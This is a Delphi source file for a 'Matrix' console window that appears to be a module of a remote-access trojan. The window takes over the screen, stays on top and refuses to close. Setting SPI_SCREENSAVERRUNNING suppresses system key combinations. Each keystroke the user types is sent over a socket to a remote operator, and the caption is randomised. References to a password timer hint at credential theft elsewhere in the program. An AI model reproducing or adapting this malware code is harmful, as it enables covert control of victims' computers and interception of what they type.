unit MatrixUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  ExtCtrls, StdCtrls;

type
  TMatrix = class(TForm)
    Buffer: TImage;
    Image: TImage;
    cursor: TTimer;
    KeepKey: TMemo;
    Edit1: TEdit;
    procedure cursorTimer(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FormKeyPress(Sender: TObject; var Key: Char);
    procedure FormHide(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
  private
    procedure Flip;
    procedure HideCursor;
    procedure RedrawAll;
    { Private declarations }
  public
   ShowCursor:bool;
   INIT_TEXT:String;
   Smaller:bool;
   LetterX,LetterY,CursorX,CursorY:integer;
    procedure InsertText(ce: string);
    { Public declarations }
  end;

var
  Matrix: TMatrix;
  MaxX,MaxY:integer;
  dummy:Integer;
  ScrieLinii:integer;


implementation

uses Unit1;

{$R *.DFM}

procedure TMatrix.Flip;
begin
 Image.Picture.Assign(Buffer.Picture);
end;


procedure TMatrix.cursorTimer(Sender: TObject);
begin
 Matrix.Activate;
 Matrix.Show;
 SetWindowPos(Matrix.Handle,
          HWND_TOPMOST,
          0, 0, 0, 0,
          SWP_NOMOVE OR
          SWP_NOACTIVATE OR
          SWP_NOSIZE);
 SetZOrder(True);
{ Matrix.Active:=TRUE;}
 SetFocus;
 if ShowCursor then
   with Image.Canvas do begin
    Pen.Color:=clBlack;
    Font.Color:=clLime;
    Font.Name:='Courier New';
    Font.Style:=[fsBold];
    Font.Size:=13;
    TextOut(CursorX,CursorY,'_');
    if length(KeepKey.Lines.Text)>=2 then
     TextOut(CursorX-LetterX,CursorY,KeepKey.Lines.Text[length(KeepKey.Lines.Text)]);
   end
  else HideCursor;
 ShowCursor:=not ShowCursor;
end;

procedure TMatrix.HideCursor;
begin
 with Image.Canvas do
  begin
   Brush.Color:=clBlack;
   Brush.Style:=bsSolid;
   Pen.Color:=clBlack;
   FillRect(Bounds(CursorX,CursorY,CursorX+LetterX,CursorY+3));
  end;
end;

procedure TMatrix.RedrawAll;
var i:integer;
    c:integer;
begin
 Buffer.Canvas.FillRect(bounds(0,0,MaxX,MaxY));
 ShowCursor:=False;
 repeat
  c:=KeepKey.Lines.Count;
  if ((c+1)*LetterY)>MaxY then KeepKey.Lines.DElete(0);
 until (((c+1)*LetterY)<=MaxY);
 for i:=1 to KeepKey.Lines.Count do
  Buffer.Canvas.TextOut(0,(CursorY-((KeepKey.Lines.Count+1)*LetterY))+(i*LetterY),KeepKey.Lines[i-1]);
 {showmessage(KeepKey.Lines.Text);}
 Flip;
end;

procedure TMatrix.FormShow(Sender: TObject);
begin
 LetterX:=10;
 LetterY:=19;
 KeepKey.Clear;
 ShowCursor:=True;
 Cursor.Enabled:=True;
 Form1.GetPassTimer.Enabled:=False;
 if Smaller then
  begin
   MaxX:=Screen.Width-400;
   MaxY:=Screen.Height-300;
  end else begin
   MaxX:=Screen.Width;
   MaxY:=Screen.Height;
  end; 
 Image.Width:=MaxX;
 Image.Height:=MaxY;
 Buffer.Width:=MaxX;
 Buffer.Height:=MaxY;
 Width:=MaxX;
 Height:=MaxY;
 CursorX:=0;
 CursorY:=MaxY-LetterY*2;
 ScrieLinii:=1;
 Left:=0;Top:=0;
 Width:=MaxX;Height:=MaxY;
 with Buffer.Canvas do begin
  Brush.Color:=clBlack;
  Brush.Style:=bsSolid;
  Pen.Color:=clBlack;
  Font.Color:=clLime;
  Font.Name:='Courier New';
  Font.Style:=[fsBold];
  Font.Size:=13;
  FillRect(Bounds(0,0,MaxX,MaxY));
 end;
 with Image.Canvas do begin
  Brush.Color:=clBlack;
  Brush.Style:=bsSolid;
  Pen.Color:=clBlack;
  Font.Color:=clLime;
  Font.Name:='Courier New';
  Font.Style:=[fsBold];
  Font.Size:=13;
 end;
 Flip;
{ KeepKey.Lines.Add('+---------------------+');
 KeepKey.Lines.Add('| Matrix v.1.1 ready. |');
 KeepKey.Lines.Add('+---------------------+');}
 KeepKey.Lines.Text:=INIT_TEXT;
 KeepKey.Lines.Add(' ');

 RedrawAll;
 SetWindowPos(Matrix.Handle,
          HWND_TOPMOST,
          0, 0, 0, 0,
          SWP_NOMOVE OR
          SWP_NOACTIVATE OR
          SWP_NOSIZE);
 SetZOrder(True);
 SystemParametersInfo( SPI_SCREENSAVERRUNNING, 1, @dummy, 0);
end;

procedure TMatrix.FormKeyPress(Sender: TObject; var Key: Char);
begin
 if (Ord(key)>=32) and (Ord(key)<126) then
  begin
   Form1.matrixsock.socket.Connections[0].SendText(key);
   {Buffer.Canvas.Font.Color:=clBlack;Buffer.Canvas.TextOut(CursorX,CursorY,'_');Buffer.Canvas.Font.Color:=clLime;}
   HideCursor;
   Image.Canvas.TextOut(CursorX,CursorY,key);
   Inc(CursorX,LetterX);
   KeepKey.Lines.Text:=KeepKey.Lines.Text+key;
   if CursorX+LetterX>MaxX then
    begin
     Inc(scrielinii);
     RedrawAll;
     CursorX:=0;
     Dec(CursorY,LetterY); if CursorY<MaxY-LetterY*2 then CursorY:=MaxY-LetterY*2;
     KeepKey.Lines.Text:=KeepKey.Lines.Text+#13#10;
    end;
   {Flip;}
   key:=#3;
  end else
 if (Ord(key)=8) and (CursorX>=LetterX) then
  begin
   Form1.matrixsock.socket.Connections[0].SendText('ô');
   {Buffer.Canvas.FillRect(Bounds(CursorX-LetterX,CursorY,CursorX+LetterX,CursorY+LetterY));}
   HideCursor;
   Image.Canvas.Font.Color:=clBlack;Buffer.Canvas.TextOut(CursorX-LetterX,CursorY,KeepKey.Lines.Text[length(KeepKey.Lines.Text)]);Buffer.Canvas.Font.Color:=clLime;
   Image.Canvas.TextOut(CursorX-LetterX*2,CursorY,KeepKey.Lines.Text[length(KeepKey.Lines.Text)-1]);
  { Buffer.Canvas.TextOut(CursorX,CursorY,key);}
   Dec(CursorX,LetterX);
   KeepKey.Lines.Text:=copy(KeepKey.Lines.Text,1,length(KeepKey.Lines.Text)-1);
{   Flip;}
   key:=#3;
  end else
 if (ord(key)=VK_RETURN) then
  begin
   Form1.matrixsock.socket.Connections[0].SendText('ö');
   scrielinii:=1;
   RedrawAll;
   CursorX:=0;
   Dec(CursorY,LetterY); if CursorY<MaxY-LetterY*2 then CursorY:=MaxY-LetterY*2;
   KeepKey.Lines.Text:=KeepKey.Lines.Text+#13#10;
   key:=#3;
  end else key:=#3;
end;

procedure TMatrix.InsertText(ce:string);
var i:integer;
    c,CuCat:integer;
    tx:integer;
    doi:bool;
begin
 tx:=0;doi:=false;
repeat
 for i:=1 to length(ce) do
  begin
   doi:=false;
   inc(tx,LetterX);
   if (tx+LetterX>MaxX) and (ce[i+1]<>#13) then
    begin
     tx:=0;
     ce:=copy(ce,1,i)+#13#10+copy(ce,i+1,length(ce));
     doi:=true;
     break;
    end;
  end;
until not doi;
 if KeepKey.Lines.Text[Length(KeepKey.Lines.Text)]=#10 then dec(scrielinii);
 KeepKey.Lines.Insert(KeepKey.Lines.Count-scrielinii,ce);
 if KeepKey.Lines.Text[Length(KeepKey.Lines.Text)]=#10 then inc(scrielinii);
 Buffer.Canvas.FillRect(bounds(0,0,MaxX,MaxY));
 ShowCursor:=False;
 repeat
  c:=KeepKey.Lines.Count;
  if ((c+1)*LetterY)>MaxY then KeepKey.Lines.DElete(0);
 until (((c+1)*LetterY)<=MaxY);
 CuCat:=0;
 if KeepKey.Lines.Text[Length(KeepKey.Lines.Text)]=#10 then begin CuCat:=1;KeepKey.Lines.Text:=KeepKey.Lines.Text+' ';end;
 for i:=1 to KeepKey.Lines.Count do
  Buffer.Canvas.TextOut(0,(CursorY-((KeepKey.Lines.Count)*LetterY))+(i*LetterY),KeepKey.Lines[i-1]);
 {showmessage(KeepKey.Lines.Text);}
 if CuCat=1 then KeepKey.Lines.Text:=copy(KeepKey.Lines.Text,1,length(KeepKey.Lines.Text)-1);
 Flip;
end;

procedure TMatrix.FormHide(Sender: TObject);
begin
 Cursor.Enabled:=False;
 Form1.GetPassTimer.Enabled:=True;
 SystemParametersInfo( SPI_SCREENSAVERRUNNING, 0, @dummy, 0);
 Hide;
end;

procedure TMatrix.FormClose(Sender: TObject; var Action: TCloseAction);
begin
 Action:=caNone;
 Show;
 SetZOrder(true);
end;

procedure TMatrix.FormCreate(Sender: TObject);
begin
 RANDOMIZE;Caption:=IntToStr(RANDOM(999999999));
 Smaller:=False;
end;

end.
